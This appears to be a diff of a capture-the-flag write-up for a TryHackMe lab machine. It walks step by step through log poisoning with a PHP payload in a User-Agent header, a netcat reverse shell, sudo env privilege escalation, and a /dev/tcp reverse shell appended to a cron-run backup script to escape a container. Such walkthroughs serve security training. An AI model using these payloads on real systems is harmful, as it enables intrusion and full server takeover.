@@ -167,7 +167,7 @@ This let's us see the following: <br/>
 
 This doesn't get us far so sending the following request I tried to send over a php reverse shell. <br/>
 ```sh
-GET / HTTP/1.1
+[GET / HTTP/1.1
 Host: 10.10.27.254
 Upgrade-Insecure-Requests: 1
 User-Agent: <?php echo file_get_contents('http://10.18.20.25/shell.php'); ?>
@@ -184,6 +184,132 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.27.254 - - [27/Oct/2023 12:51:21] "GET / HTTP/1.0" 200 -
 10.10.27.254 - - [27/Oct/2023 12:51:21] "GET /shell.php HTTP/1.0" 200 -
 ```
+
+After this going to `http://10.10.212.103/shell.php` will activate our shell. <br/>
+```sh
+nc -lnvp 9999
+listening on [any] 9999 ...
+connect to [10.18.20.25] from (UNKNOWN) [10.10.212.103] 45696
+Linux 10660a7a2463 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
+ 12:09:51 up 10 min,  0 users,  load average: 0.01, 0.04, 0.04
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ export TERM=xterm
+$ whoami
+www-data
+```
+
+Getting the first flag: <br/>
+```sh
+$ ls /var/www/html/
+cat.php
+cats
+dog.php
+dogs
+flag.php
+index.php
+shell.php
+style.css  
+$ cat /var/www/html/flag.php
+<?php
+$flag_1 = "THM{REDACTED}"
+?>
+```
+
+Priviledge escalation: <br/>
+```sh
+$ sudo -l
+Matching Defaults entries for www-data on 10660a7a2463:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+User www-data may run the following commands on 10660a7a2463:
+    (root) NOPASSWD: /usr/bin/env  
+```
+
+Finding binary exploit on GTFOBins. (https://gtfobins.github.io/gtfobins/env/) <br/>
+```sh
+$ sudo env /bin/sh
+$ whoami
+root
+$ ls /root/
+flag3.txt
+$ cat /root/*
+THM{REDACTED}
+```
+
+Seems like we skipped a flag. Anyway let's find the second flag. <br/>
+```sh
+$ ls -la /home/
+total 8
+drwxr-xr-x 2 root root 4096 Feb  1  2020 .
+drwxr-xr-x 1 root root 4096 Oct 27 12:00 ..
+$ ls /var/www/
+flag2_QMW7JvaY2LvK.txt
+html
+cat /var/www/*
+THM{REDACTED}
+```
+
+After some searching I found an interesting directory. <br/>
+```sh
+$ ls -la /opt/
+total 12
+drwxr-xr-x 1 root root 4096 Oct 27 12:00 .
+drwxr-xr-x 1 root root 4096 Oct 27 12:00 ..
+drwxr-xr-x 2 root root 4096 Apr  8  2020 backups
+$ ls -la /opt/backups/
+total 2892
+drwxr-xr-x 2 root root    4096 Apr  8  2020 .
+drwxr-xr-x 1 root root    4096 Oct 27 12:00 ..
+-rwxr--r-- 1 root root      69 Mar 10  2020 backup.sh
+-rw-r--r-- 1 root root 2949120 Oct 27 12:22 backup.tar
+$ cat backup.sh
+#!/bin/bash
+tar cf /root/container/backup/backup.tar /root/container
+```
+
+If this bash file is being executed automatically every few minutes or so we may include a reverse shell to gain access to outside the container. <br/>
+```sh
+$ echo "bash -i >& /dev/tcp/10.18.20.25/4444 0>&1" >> backup.sh
+$ cat backup.sh
+#!/bin/bash
+tar cf /root/container/backup/backup.tar /root/container
+bash -i >& /dev/tcp/10.18.20.25/4444 0>&1
+```
+
+After a few seconds I successfully got another reverse shell. <br/>
+```sh
+nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.18.20.25] from (UNKNOWN) [10.10.212.103] 38708
+bash: cannot set terminal process group (2991): Inappropriate ioctl for device
+bash: no job control in this shell
+root@dogcat:~# whoami
+root
+```
+
+Getting the last flag: <br/>
+```sh
+root@dogcat:~# ls -la /root/
+total 40
+drwx------  6 root root 4096 Apr  8  2020 .
+drwxr-xr-x 24 root root 4096 Apr  8  2020 ..
+lrwxrwxrwx  1 root root    9 Mar 10  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Apr  8  2020 .cache
+drwxr-xr-x  5 root root 4096 Mar 10  2020 container
+-rw-r--r--  1 root root   80 Mar 10  2020 flag4.txt
+drwx------  3 root root 4096 Apr  8  2020 .gnupg
+drwxr-xr-x  3 root root 4096 Apr  8  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   66 Mar 10  2020 .selected_editor
+root@dogcat:~# cat /root/flag4.txt
+THM{REDACTED}
+```
+
+
+
+
 
 
 
